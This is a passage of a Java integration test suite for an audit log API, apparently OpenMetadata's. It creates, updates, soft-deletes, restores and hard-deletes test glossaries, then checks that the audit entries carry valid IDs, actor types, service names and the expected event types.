      waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityCreated");

      // Update the glossary description using PATCH
      String patchJson =
          "[{\"op\": \"replace\", \"path\": \"/description\", \"value\": \"Updated description for audit test\"}]";
      client
          .getHttpClient()
          .executeForString(
              HttpMethod.PATCH,
              "/v1/glossaries/" + glossaryId,
              patchJson,
              RequestOptions.builder()
                  .header("Content-Type", "application/json-patch+json")
                  .build());

      // Verify entityUpdated or entityFieldsChanged audit log entry
      Map<String, Object> auditEntry =
          waitForAuditLogEntryMultipleTypes(
              client,
              glossaryFqn,
              "glossary",
              java.util.List.of("entityUpdated", "entityFieldsChanged"));
      assertNotNull(auditEntry, "entityUpdated/entityFieldsChanged audit log entry should exist");
      verifyAuditEntryHasValidUUIDs(auditEntry, glossaryId);
      assertTrue(
          "entityUpdated".equals(auditEntry.get("eventType"))
              || "entityFieldsChanged".equals(auditEntry.get("eventType")),
          "Event type should be entityUpdated or entityFieldsChanged");
    } finally {
      deleteGlossary(client, glossaryId);
    }
  }

  @Test
  void test_auditLog_entitySoftDeleted_hasValidUUIDs() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    // Create a glossary
    String glossaryName =
        "AuditLogSoftDeleteTest_" + java.util.UUID.randomUUID().toString().substring(0, 8);
    String createJson =
        String.format(
            "{\"name\": \"%s\", \"displayName\": \"Test Glossary\", \"description\": \"Test for soft delete audit\"}",
            glossaryName);

    String createResponse =
        client
            .getHttpClient()
            .executeForString(
                HttpMethod.POST, "/v1/glossaries", createJson, RequestOptions.builder().build());
    Map<String, Object> glossary = MAPPER.readValue(createResponse, new TypeReference<>() {});
    String glossaryId = glossary.get("id").toString();
    String glossaryFqn = glossary.get("fullyQualifiedName").toString();

    try {
      // Wait for create event first
      waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityCreated");

      // Soft delete the glossary
      client
          .getHttpClient()
          .executeForString(
              HttpMethod.DELETE,
              "/v1/glossaries/" + glossaryId,
              null,
              RequestOptions.builder().build());

      // Verify entitySoftDeleted audit log entry
      Map<String, Object> auditEntry =
          waitForAuditLogEntry(client, glossaryFqn, "glossary", "entitySoftDeleted");
      assertNotNull(
          auditEntry, "entitySoftDeleted audit log entry should exist for: " + glossaryFqn);
      verifyAuditEntryHasValidUUIDs(auditEntry, glossaryId);
      assertEquals("entitySoftDeleted", auditEntry.get("eventType"));
    } finally {
      // Hard delete for cleanup
      deleteGlossary(client, glossaryId);
    }
  }

  @Test
  void test_auditLog_entityRestored_hasValidUUIDs() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    // Create a glossary
    String glossaryName =
        "AuditLogRestoreTest_" + java.util.UUID.randomUUID().toString().substring(0, 8);
    String createJson =
        String.format(
            "{\"name\": \"%s\", \"displayName\": \"Test Glossary\", \"description\": \"Test for restore audit\"}",
            glossaryName);

    String createResponse =
        client
            .getHttpClient()
            .executeForString(
                HttpMethod.POST, "/v1/glossaries", createJson, RequestOptions.builder().build());
    Map<String, Object> glossary = MAPPER.readValue(createResponse, new TypeReference<>() {});
    String glossaryId = glossary.get("id").toString();
    String glossaryFqn = glossary.get("fullyQualifiedName").toString();

    try {
      // Wait for create event
      waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityCreated");

      // Soft delete the glossary
      client
          .getHttpClient()
          .executeForString(
              HttpMethod.DELETE,
              "/v1/glossaries/" + glossaryId,
              null,
              RequestOptions.builder().build());
      waitForAuditLogEntry(client, glossaryFqn, "glossary", "entitySoftDeleted");

      // Restore the glossary
      client
          .getHttpClient()
          .executeForString(
              HttpMethod.PUT,
              "/v1/glossaries/restore",
              "{\"id\": \"" + glossaryId + "\"}",
              RequestOptions.builder().build());

      // Verify entityRestored audit log entry
      Map<String, Object> auditEntry =
          waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityRestored");
      assertNotNull(auditEntry, "entityRestored audit log entry should exist for: " + glossaryFqn);
      verifyAuditEntryHasValidUUIDs(auditEntry, glossaryId);
      assertEquals("entityRestored", auditEntry.get("eventType"));
    } finally {
      deleteGlossary(client, glossaryId);
    }
  }

  @Test
  void test_auditLog_entityDeleted_hasValidUUIDs() throws Exception {
    OpenMetadataClient client = SdkClients.adminClient();

    // Create a glossary
    String glossaryName =
        "AuditLogHardDeleteTest_" + java.util.UUID.randomUUID().toString().substring(0, 8);
    String createJson =
        String.format(
            "{\"name\": \"%s\", \"displayName\": \"Test Glossary\", \"description\": \"Test for hard delete audit\"}",
            glossaryName);

    String createResponse =
        client
            .getHttpClient()
            .executeForString(
                HttpMethod.POST, "/v1/glossaries", createJson, RequestOptions.builder().build());
    Map<String, Object> glossary = MAPPER.readValue(createResponse, new TypeReference<>() {});
    String glossaryId = glossary.get("id").toString();
    String glossaryFqn = glossary.get("fullyQualifiedName").toString();

    // Wait for create event
    waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityCreated");

    // Hard delete the glossary
    client
        .getHttpClient()
        .executeForString(
            HttpMethod.DELETE,
            "/v1/glossaries/" + glossaryId + "?hardDelete=true",
            null,
            RequestOptions.builder().build());

    // Verify entityDeleted audit log entry
    Map<String, Object> auditEntry =
        waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityDeleted");
    assertNotNull(auditEntry, "entityDeleted audit log entry should exist for: " + glossaryFqn);
    verifyAuditEntryHasValidUUIDs(auditEntry, glossaryId);
    assertEquals("entityDeleted", auditEntry.get("eventType"));
  }

  @Test
  void test_auditLog_allEventTypes_summary() throws Exception {
    // This test creates one entity and performs all operations to verify the complete audit trail
    OpenMetadataClient client = SdkClients.adminClient();

    String glossaryName =
        "AuditLogFullTest_" + java.util.UUID.randomUUID().toString().substring(0, 8);
    String createJson =
        String.format(
            "{\"name\": \"%s\", \"displayName\": \"Full Audit Test\", \"description\": \"Testing all event types\"}",
            glossaryName);

    // 1. Create
    String createResponse =
        client
            .getHttpClient()
            .executeForString(
                HttpMethod.POST, "/v1/glossaries", createJson, RequestOptions.builder().build());
    Map<String, Object> glossary = MAPPER.readValue(createResponse, new TypeReference<>() {});
    String glossaryId = glossary.get("id").toString();
    String glossaryFqn = glossary.get("fullyQualifiedName").toString();

    Map<String, Object> createEntry =
        waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityCreated");
    assertNotNull(createEntry, "entityCreated should be logged");
    verifyAuditEntryHasValidUUIDs(createEntry, glossaryId);

    // 2. Update
    String patchJson =
        "[{\"op\": \"replace\", \"path\": \"/description\", \"value\": \"Updated\"}]";
    client
        .getHttpClient()
        .executeForString(
            HttpMethod.PATCH,
            "/v1/glossaries/" + glossaryId,
            patchJson,
            RequestOptions.builder().header("Content-Type", "application/json-patch+json").build());

    Map<String, Object> updateEntry =
        waitForAuditLogEntryMultipleTypes(
            client,
            glossaryFqn,
            "glossary",
            java.util.List.of("entityUpdated", "entityFieldsChanged"));
    assertNotNull(updateEntry, "entityUpdated/entityFieldsChanged should be logged");
    verifyAuditEntryHasValidUUIDs(updateEntry, glossaryId);

    // 3. Soft Delete
    client
        .getHttpClient()
        .executeForString(
            HttpMethod.DELETE,
            "/v1/glossaries/" + glossaryId,
            null,
            RequestOptions.builder().build());

    Map<String, Object> softDeleteEntry =
        waitForAuditLogEntry(client, glossaryFqn, "glossary", "entitySoftDeleted");
    assertNotNull(softDeleteEntry, "entitySoftDeleted should be logged");
    verifyAuditEntryHasValidUUIDs(softDeleteEntry, glossaryId);

    // 4. Restore
    client
        .getHttpClient()
        .executeForString(
            HttpMethod.PUT,
            "/v1/glossaries/restore",
            "{\"id\": \"" + glossaryId + "\"}",
            RequestOptions.builder().build());

    Map<String, Object> restoreEntry =
        waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityRestored");
    assertNotNull(restoreEntry, "entityRestored should be logged");
    verifyAuditEntryHasValidUUIDs(restoreEntry, glossaryId);

    // 5. Hard Delete
    client
        .getHttpClient()
        .executeForString(
            HttpMethod.DELETE,
            "/v1/glossaries/" + glossaryId + "?hardDelete=true",
            null,
            RequestOptions.builder().build());

    Map<String, Object> hardDeleteEntry =
        waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityDeleted");
    assertNotNull(hardDeleteEntry, "entityDeleted should be logged");
    verifyAuditEntryHasValidUUIDs(hardDeleteEntry, glossaryId);
  }

  // ==================== Helper Methods for Audit Log Verification ====================

  private Map<String, Object> waitForAuditLogEntry(
      OpenMetadataClient client, String entityFqn, String entityType, String eventType)
      throws Exception {
    return waitForAuditLogEntryMultipleTypes(
        client, entityFqn, entityType, java.util.List.of(eventType));
  }

  private Map<String, Object> waitForAuditLogEntryMultipleTypes(
      OpenMetadataClient client,
      String entityFqn,
      String entityType,
      java.util.List<String> eventTypes)
      throws Exception {
    long startTime = System.currentTimeMillis();

    while ((System.currentTimeMillis() - startTime) < AUDIT_LOG_TIMEOUT_MS) {
      for (String eventType : eventTypes) {
        Map<String, String> params = new HashMap<>();
        params.put("entityFQN", entityFqn);
        params.put("entityType", entityType);
        params.put("eventType", eventType);
        params.put("limit", "1");

        String response = executeGet(client, AUDIT_LOGS_PATH, params);
        Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
        java.util.List<Map<String, Object>> data =
            (java.util.List<Map<String, Object>>) result.get("data");

        if (data != null && !data.isEmpty()) {
          return data.get(0);
        }
      }
      Thread.sleep(AUDIT_LOG_POLL_INTERVAL_MS);
    }

    // Get diagnostic info: check total audit log count and recent entries
    String diagnosticInfo = getDiagnosticInfo(client, entityType);
    fail(
        "Audit log entry not found within timeout for entityFQN="
            + entityFqn
            + ", entityType="
            + entityType
            + ", eventTypes="
            + eventTypes
            + ". "
            + diagnosticInfo);
    return null;
  }

  private String getDiagnosticInfo(OpenMetadataClient client, String entityType) {
    try {
      // Check total count of audit logs
      Map<String, String> params = new HashMap<>();
      params.put("limit", "5");
      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      Map<String, Object> paging = (Map<String, Object>) result.get("paging");
      int total =
          paging != null && paging.get("total") != null
              ? ((Number) paging.get("total")).intValue()
              : 0;

      // Check recent entries for this entity type
      params.put("entityType", entityType);
      response = executeGet(client, AUDIT_LOGS_PATH, params);
      result = MAPPER.readValue(response, new TypeReference<>() {});
      java.util.List<Map<String, Object>> data =
          (java.util.List<Map<String, Object>>) result.get("data");
      int entityTypeCount = data != null ? data.size() : 0;

      return String.format(
          "Diagnostics: Total audit logs=%d, Recent %s logs=%d. "
              + "AuditLogConsumer may not be enabled or events are not being processed.",
          total, entityType, entityTypeCount);
    } catch (Exception e) {
      return "Failed to get diagnostic info: " + e.getMessage();
    }
  }

  private void verifyAuditEntryHasValidUUIDs(
      Map<String, Object> auditEntry, String expectedEntityId) {
    // Verify changeEventId is a valid UUID (not empty)
    Object changeEventId = auditEntry.get("changeEventId");
    assertNotNull(changeEventId, "changeEventId should not be null");
    String changeEventIdStr = changeEventId.toString();
    assertFalse(
        changeEventIdStr.isEmpty(),
        "changeEventId should not be empty - indicates UUID binding failure with @BindBean");
    try {
      java.util.UUID.fromString(changeEventIdStr);
    } catch (IllegalArgumentException e) {
      fail("changeEventId should be a valid UUID, got: " + changeEventIdStr);
    }

    // Verify entityId is a valid UUID and matches expected
    Object entityId = auditEntry.get("entityId");
    assertNotNull(entityId, "entityId should not be null");
    String entityIdStr = entityId.toString();
    assertFalse(
        entityIdStr.isEmpty(),
        "entityId should not be empty - indicates UUID binding failure with @BindBean");
    assertEquals(
        expectedEntityId, entityIdStr, "entityId in audit log should match the entity's ID");
  }

  private void deleteGlossary(OpenMetadataClient client, String glossaryId) {
    try {
      client
          .getHttpClient()
          .executeForString(
              HttpMethod.DELETE,
              "/v1/glossaries/" + glossaryId + "?hardDelete=true",
              null,
              RequestOptions.builder().build());
    } catch (Exception e) {
      // Ignore cleanup errors
    }
  }

  private String executeGet(OpenMetadataClient client, String path, Map<String, String> params)
      throws Exception {
    String fullPath = path;
    if (params != null && !params.isEmpty()) {
      StringBuilder queryString = new StringBuilder("?");
      boolean first = true;
      for (Map.Entry<String, String> entry : params.entrySet()) {
        if (!first) {
          queryString.append("&");
        }
        queryString
            .append(java.net.URLEncoder.encode(entry.getKey(), "UTF-8"))
            .append("=")
            .append(java.net.URLEncoder.encode(entry.getValue(), "UTF-8"));
        first = false;
      }
      fullPath = path + queryString;
    }

    return client
        .getHttpClient()
        .executeForString(HttpMethod.GET, fullPath, null, RequestOptions.builder().build());
  }

  // ==================== Actor Type Detection Tests ====================
  // These tests verify the determineActorType logic in AuditLogRepository

  @Test
  void test_actorType_regularUser_isUser() throws Exception {
    // Regular users (like "admin") should have actorType=USER
    OpenMetadataClient client = SdkClients.adminClient();

    // Create a glossary as admin (regular user)
    String glossaryName =
        "ActorTypeUserTest_" + java.util.UUID.randomUUID().toString().substring(0, 8);
    String createJson =
        String.format(
            "{\"name\": \"%s\", \"displayName\": \"Actor Type Test\", \"description\": \"Test for USER actor type\"}",
            glossaryName);

    String createResponse =
        client
            .getHttpClient()
            .executeForString(
                HttpMethod.POST, "/v1/glossaries", createJson, RequestOptions.builder().build());
    Map<String, Object> glossary = MAPPER.readValue(createResponse, new TypeReference<>() {});
    String glossaryId = glossary.get("id").toString();
    String glossaryFqn = glossary.get("fullyQualifiedName").toString();

    try {
      Map<String, Object> auditEntry =
          waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityCreated");
      assertNotNull(auditEntry, "Audit log entry should exist");
      assertEquals("USER", auditEntry.get("actorType"), "Regular user should have actorType=USER");
      assertEquals("admin", auditEntry.get("userName"));
    } finally {
      deleteGlossary(client, glossaryId);
    }
  }

  @Test
  void test_actorType_enumValues_allSupported() throws Exception {
    // Verify all ActorType enum values are supported via the API filter
    OpenMetadataClient client = SdkClients.adminClient();

    // Test each valid actor type filter
    String[] validActorTypes = {"USER", "BOT", "AGENT"};

    for (String actorType : validActorTypes) {
      Map<String, String> params = new HashMap<>();
      params.put("actorType", actorType);
      params.put("limit", "5");

      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      assertNotNull(response, "API should accept actorType=" + actorType);

      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("data"), "Response should contain data for actorType=" + actorType);

      // Verify any returned entries have the correct actorType
      java.util.List<Map<String, Object>> data =
          (java.util.List<Map<String, Object>>) result.get("data");
      for (Map<String, Object> entry : data) {
        assertEquals(
            actorType, entry.get("actorType"), "Returned entries should match requested actorType");
      }
    }
  }

  @Test
  void test_actorType_botFilter_returnsOnlyBots() throws Exception {
    // Verify BOT filter returns only bot-generated entries
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("actorType", "BOT");
    params.put("limit", "50");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    // All returned entries should have actorType=BOT
    for (Map<String, Object> entry : data) {
      assertEquals("BOT", entry.get("actorType"), "All entries should be from BOT actors");
    }
  }

  @Test
  void test_actorType_agentFilter_returnsOnlyAgents() throws Exception {
    // Verify AGENT filter returns only agent-generated entries
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("actorType", "AGENT");
    params.put("limit", "50");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    // All returned entries should have actorType=AGENT
    for (Map<String, Object> entry : data) {
      assertEquals("AGENT", entry.get("actorType"), "All entries should be from AGENT actors");
    }
  }

  // ==================== Service Name Extraction Tests ====================
  // These tests verify the extractServiceName logic in AuditLogRepository

  @Test
  void test_serviceName_extractedFromEntityFQN() throws Exception {
    // Verify serviceName is correctly extracted from entity FQN
    // For "sample_data.ecommerce_db.shopify.raw_product_catalog", serviceName should be
    // "sample_data"
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("entityType", "table");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    for (Map<String, Object> entry : data) {
      String entityFqn = (String) entry.get("entityFQN");
      String serviceName = (String) entry.get("serviceName");

      if (entityFqn != null && entityFqn.contains(".")) {
        // Service name should be the first part of the FQN
        String expectedServiceName = entityFqn.split("\\.")[0];
        assertEquals(
            expectedServiceName,
            serviceName,
            "serviceName should be first part of entityFQN: " + entityFqn);
      }
    }
  }

  @Test
  void test_serviceName_filterWorksCorrectly() throws Exception {
    // Verify serviceName filter returns entries with matching service
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("serviceName", "sample_data");
    params.put("limit", "20");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    // All returned entries should have serviceName=sample_data
    for (Map<String, Object> entry : data) {
      String serviceName = (String) entry.get("serviceName");
      assertEquals("sample_data", serviceName, "All entries should have serviceName=sample_data");
    }
  }

  @Test
  void test_serviceName_nullForTopLevelEntities() throws Exception {
    // Top-level entities (like glossaries) don't have a service, so serviceName should be the FQN
    // itself or the first part
    OpenMetadataClient client = SdkClients.adminClient();

    // Create a glossary (top-level entity)
    String glossaryName =
        "ServiceNameTest_" + java.util.UUID.randomUUID().toString().substring(0, 8);
    String createJson =
        String.format(
            "{\"name\": \"%s\", \"displayName\": \"Service Name Test\", \"description\": \"Test\"}",
            glossaryName);

    String createResponse =
        client
            .getHttpClient()
            .executeForString(
                HttpMethod.POST, "/v1/glossaries", createJson, RequestOptions.builder().build());
    Map<String, Object> glossary = MAPPER.readValue(createResponse, new TypeReference<>() {});
    String glossaryId = glossary.get("id").toString();
    String glossaryFqn = glossary.get("fullyQualifiedName").toString();

    try {
      Map<String, Object> auditEntry =
          waitForAuditLogEntry(client, glossaryFqn, "glossary", "entityCreated");
      assertNotNull(auditEntry);

      // For glossary FQN like "GlossaryName", serviceName should be "GlossaryName"
      String serviceName = (String) auditEntry.get("serviceName");
      assertEquals(
          glossaryFqn,
          serviceName,
          "For top-level entities, serviceName should be the entity name");
    } finally {
      deleteGlossary(client, glossaryId);
    }
  }

  // ==================== Event Type Filtering Tests ====================
  // These tests verify that only supported event types are stored in audit log

  @Test
  void test_eventType_supportedTypes_allStoredInAuditLog() throws Exception {
    // Verify all supported event types can be filtered
    OpenMetadataClient client = SdkClients.adminClient();

    String[] supportedEventTypes = {
      "entityCreated",
      "entityUpdated",
      "entityFieldsChanged",
      "entitySoftDeleted",
      "entityDeleted",
      "entityRestored"
    };

    for (String eventType : supportedEventTypes) {
      Map<String, String> params = new HashMap<>();
      params.put("eventType", eventType);
      params.put("limit", "5");

      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      assertNotNull(response, "API should accept eventType=" + eventType);

      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      assertNotNull(result.get("data"), "Response should contain data for eventType=" + eventType);

      // Verify any returned entries have the correct eventType
      java.util.List<Map<String, Object>> data =
          (java.util.List<Map<String, Object>>) result.get("data");
      for (Map<String, Object> entry : data) {
        assertEquals(
            eventType, entry.get("eventType"), "Returned entries should match requested eventType");
      }
    }
  }

  @Test
  void test_eventType_unsupportedType_returnsEmptyResults() throws Exception {
    // Verify unsupported event types return empty results (not an error)
    // Events like THREAD_UPDATED, POST_UPDATED etc. should not be in audit log
    OpenMetadataClient client = SdkClients.adminClient();

    String[] unsupportedEventTypes = {
      "threadUpdated", "postUpdated", "taskClosed", "taskResolved", "entityNoChange"
    };

    for (String eventType : unsupportedEventTypes) {
      Map<String, String> params = new HashMap<>();
      params.put("eventType", eventType);
      params.put("limit", "5");

      String response = executeGet(client, AUDIT_LOGS_PATH, params);
      assertNotNull(response, "API should accept unsupported eventType without error");

      Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
      java.util.List<Map<String, Object>> data =
          (java.util.List<Map<String, Object>>) result.get("data");

      // Unsupported event types should not appear in audit log
      assertTrue(
          data == null || data.isEmpty(),
          "Unsupported event type " + eventType + " should not have any entries in audit log");
    }
  }

  @Test
  void test_eventType_entityCreated_hasCorrectStructure() throws Exception {
    // Verify entityCreated events have expected structure
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("eventType", "entityCreated");
    params.put("limit", "1");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    if (data != null && !data.isEmpty()) {
      Map<String, Object> entry = data.get(0);

      // Verify required fields
      assertNotNull(entry.get("id"), "id should not be null");
      assertNotNull(entry.get("changeEventId"), "changeEventId should not be null");
      assertNotNull(entry.get("eventTs"), "eventTs should not be null");
      assertEquals("entityCreated", entry.get("eventType"));
      assertNotNull(entry.get("userName"), "userName should not be null");
      assertNotNull(entry.get("actorType"), "actorType should not be null");
      assertNotNull(entry.get("entityType"), "entityType should not be null");
    }
  }

  // ==================== Auth Event Tests ====================
  // These tests verify login/logout event handling

  @Test
  void test_eventType_userLogin_supportedViaFilter() throws Exception {
    // Verify userLogin events can be filtered (if any exist)
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("eventType", "userLogin");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response, "API should accept userLogin eventType filter");

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));

    // If there are login events, verify they have correct structure
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");
    for (Map<String, Object> entry : data) {
      assertEquals("userLogin", entry.get("eventType"));
      assertNotNull(entry.get("userName"), "Login events should have userName");
    }
  }

  @Test
  void test_eventType_userLogout_supportedViaFilter() throws Exception {
    // Verify userLogout events can be filtered (if any exist)
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("eventType", "userLogout");
    params.put("limit", "10");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response, "API should accept userLogout eventType filter");

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    assertNotNull(result.get("data"));

    // If there are logout events, verify they have correct structure
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");
    for (Map<String, Object> entry : data) {
      assertEquals("userLogout", entry.get("eventType"));
      assertNotNull(entry.get("userName"), "Logout events should have userName");
    }
  }

  // ==================== Null/Empty Handling Tests ====================

  @Test
  void test_auditLog_skipsNullEventId() throws Exception {
    // This test verifies the API doesn't return malformed entries
    // The write() method in AuditLogRepository skips events with null IDs
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("limit", "100");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    // All entries should have valid changeEventId (never null or empty)
    for (Map<String, Object> entry : data) {
      Object changeEventId = entry.get("changeEventId");
      assertNotNull(changeEventId, "changeEventId should never be null in returned entries");
      assertFalse(
          changeEventId.toString().isEmpty(),
          "changeEventId should never be empty in returned entries");
    }
  }

  @Test
  void test_auditLog_actorTypeDefaultsToUser() throws Exception {
    // Verify actorType defaults to USER when not explicitly set
    OpenMetadataClient client = SdkClients.adminClient();

    Map<String, String> params = new HashMap<>();
    params.put("limit", "50");

    String response = executeGet(client, AUDIT_LOGS_PATH, params);
    assertNotNull(response);

    Map<String, Object> result = MAPPER.readValue(response, new TypeReference<>() {});
    java.util.List<Map<String, Object>> data =
        (java.util.List<Map<String, Object>>) result.get("data");

    // All entries should have a valid actorType (never null)
    for (Map<String, Object> entry : data) {
      String actorType = (String) entry.get("actorType");
      assertNotNull(actorType, "actorType should never be null");
      assertTrue(
          actorType.equals("USER") || actorType.equals("BOT") || actorType.equals("AGENT"),
          "actorType should be USER, BOT, or AGENT, got: " + actorType);
    }
  }
}
